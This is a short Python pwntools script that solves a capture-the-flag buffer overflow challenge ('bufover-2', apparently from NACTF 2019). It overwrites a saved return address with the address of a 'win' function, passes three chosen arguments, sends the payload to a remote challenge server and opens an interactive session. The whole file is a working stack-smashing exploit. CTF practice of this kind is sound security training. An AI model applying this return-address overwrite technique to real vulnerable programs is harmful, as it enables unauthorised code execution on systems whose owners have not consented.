#!/usr/bin/env python

from pwn import *

arg1 = 0x14b4da55
arg2 = 0
arg3 = 0xf00db4be
e = ELF('./bufover-2')
win = e.symbols['win']
print hex(win)
p = remote('shell.2019.nactf.com', 31184)
#p = process('./bufover-2')
p.recv()
payload = "A"*28
payload+= p32(win)
payload+= "TRSH"
payload+= p32(arg1)
payload+= p32(arg2)
payload+= p32(arg3)
p.sendline(payload)
p.interactive()